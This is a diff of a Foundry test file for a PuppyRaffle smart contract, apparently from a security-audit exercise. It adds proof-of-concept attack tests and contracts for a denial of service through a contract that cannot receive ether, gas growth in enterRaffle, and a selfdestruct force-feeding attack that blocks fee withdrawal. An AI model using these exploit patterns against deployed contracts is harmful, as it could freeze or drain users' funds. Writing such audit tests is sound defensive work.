@@ -213,7 +213,7 @@ contract PuppyRaffleTest is Test {
     //
     // Attacks
     //
-    function test_srw_reentrancy_attack_can_pull_all_funds_via_refund()
+    function test_srw_REENTRANCY_can_drain_funds_via_refund()
         public
         playersEntered
     {
@@ -233,7 +233,7 @@ contract PuppyRaffleTest is Test {
         assertEq(address(attack).balance, entranceFee * 5);
     }
 
-    function test_srw_strict_equality_can_be_exploited_so_cant_withdraw_fees() 
+    function test_srw_SELFDESTRUCT_DOS_cant_withdraw_fees_if_selfdestruct()
         public
         playersEntered
     {
@@ -248,6 +248,70 @@ contract PuppyRaffleTest is Test {
 
         vm.expectRevert();
         puppyRaffle.withdrawFees();
+    }
+
+    function test_srw_SEND_ETHER_DOS_denying_funds_from_selectWinner_can_DOS_withdrawFees()
+        public
+    {
+        address[] memory players = new address[](3);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
+
+        DenialOfServiceAttack attack = new DenialOfServiceAttack(
+            puppyRaffle,
+            entranceFee
+        );
+        vm.deal(address(attack), entranceFee);
+        attack.attack();
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        vm.expectRevert();
+        puppyRaffle.selectWinner();
+        assertEq(puppyRaffle.balanceOf(address(attack)), 0);
+
+        vm.warp(block.timestamp + duration + 2);
+        vm.roll(block.number + 2);
+
+        puppyRaffle.selectWinner();
+        puppyRaffle.withdrawFees();
+    }
+
+    function test_srw_GAS_DOS_enterRaffle_gets_more_expensive_for_consecutive_players()
+        public
+    {
+        uint256 i = 0;
+
+        while (i < 4) {
+            uint256 gasSpent = enterAndLogGas(i);
+            console.log("[ Player ", i, "] Gas spent: ", gasSpent);
+            i += 1;
+        }
+
+        while (i < 100) {
+            enterAndLogGas(i);
+            i += 1;
+        }
+
+        uint256 gasSpent = enterAndLogGas(i);
+        console.log("[ Player ", i, "] Gas spent: ", gasSpent);
+    }
+
+    function enterAndLogGas(uint256 i) internal returns (uint256) {
+        address[] memory players = new address[](1);
+        players[0] = address(i);
+        uint256 gasStart = gasleft();
+
+        vm.deal(address(i), entranceFee);
+        vm.prank(address(i));
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        uint256 gasSpent = gasStart - gasleft();
+
+        return gasSpent;
     }
 }
 
@@ -282,8 +346,7 @@ contract ReentrancyAttack {
     }
 }
 
-contract SelfDestructAttack 
-{
+contract SelfDestructAttack {
     PuppyRaffle s_puppyRaffle;
 
     constructor(PuppyRaffle puppyRaffle) {
@@ -292,5 +355,22 @@ contract SelfDestructAttack
 
     function attack() public {
         selfdestruct(payable(address(s_puppyRaffle)));
+    }
+}
+
+contract DenialOfServiceAttack {
+    PuppyRaffle s_puppyRaffle;
+    uint256 s_entranceFee;
+
+    constructor(PuppyRaffle puppyRaffle, uint256 entranceFee) {
+        s_puppyRaffle = puppyRaffle;
+        s_entranceFee = entranceFee;
+    }
+
+    function attack() public {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+
+        s_puppyRaffle.enterRaffle{value: s_entranceFee}(players);
     }
 }
